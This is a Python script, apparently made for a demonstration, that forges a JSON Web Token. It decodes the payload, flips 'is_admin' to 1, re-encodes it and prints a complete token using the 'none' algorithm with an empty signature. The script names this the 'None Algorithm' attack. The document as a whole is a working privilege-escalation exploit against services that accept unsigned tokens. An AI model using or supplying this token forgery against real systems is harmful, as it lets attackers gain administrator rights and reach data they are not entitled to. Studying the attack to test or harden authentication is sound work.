import base64
import json

def base64url_decode(input_str):
    """Decodes a Base64Url string."""
    # Add padding if necessary
    padding = '=' * (4 - len(input_str) % 4)
    decoded_str = input_str.replace('-', '+').replace('_', '/') + padding
    return base64.b64decode(decoded_str)

def base64url_encode(input_bytes):
    """Encodes bytes to a Base64Url string."""
    encoded_str = base64.b64encode(input_bytes).decode('utf-8')
    return encoded_str.replace('+', '-').replace('/', '_').replace('=', '')

def modify_jwt_payload_for_admin(jwt_payload_b64url, target_admin_value=1):
    """
    Decodes a Base64Url-encoded JWT payload, sets 'is_admin' to the target value,
    and re-encodes it to Base64Url.

    Args:
        jwt_payload_b64url (str): The Base64Url encoded JWT payload string.
        target_admin_value (int/bool): The desired value for 'is_admin' (1 or True).

    Returns:
        str: The new Base64Url encoded JWT payload string with 'is_admin' modified.
        None: If the payload is not valid JSON.
    """
    try:
        # 1. Decode the Base64Url payload
        decoded_bytes = base64url_decode(jwt_payload_b64url)
        payload_json_str = decoded_bytes.decode('utf-8')

        # 2. Parse the JSON payload
        payload_dict = json.loads(payload_json_str)

        # 3. Modify the 'is_admin' field
        payload_dict['is_admin'] = target_admin_value
        print(f"Original payload (decoded): {payload_json_str}")
        print(f"Modified payload (decoded): {json.dumps(payload_dict)}")

        # 4. Convert the modified dictionary back to JSON string
        modified_payload_json_str = json.dumps(payload_dict, separators=(',', ':')) # separators for compact output

        # 5. Base64Url encode the modified JSON string
        re_encoded_payload_b64url = base64url_encode(modified_payload_json_str.encode('utf-8'))

        return re_encoded_payload_b64url

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# --- Example Usage ---
if __name__ == "__main__":
    # Your example JWT payload (Base64Url encoded)
    original_payload_b64url = "eyJpZCI6MywiZW1haWwiOiJ0ZXN0QGdtYWlsLmNvbSIsImlzX2FkbWluIjowLCJpc3N1ZWQiOjE3NDg0MzMwMzN9"

    print(f"Input payload (Base64Url): {original_payload_b64url}\n")

    modified_payload = modify_jwt_payload_for_admin(original_payload_b64url, target_admin_value=1)

    if modified_payload:
        print(f"\nNew payload (Base64Url) with is_admin=1: {modified_payload}")
        print("\n--- For your demo, you would typically use this as part of a full JWT string like this: ---")
        print("YOUR_HEADER_B64URL." + modified_payload + ".YOUR_SIGNATURE_B64URL_OR_EMPTY")
        print("\nRemember, for the 'None Algorithm' attack, the signature part would be empty, like:")
        print("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0." + modified_payload + ".")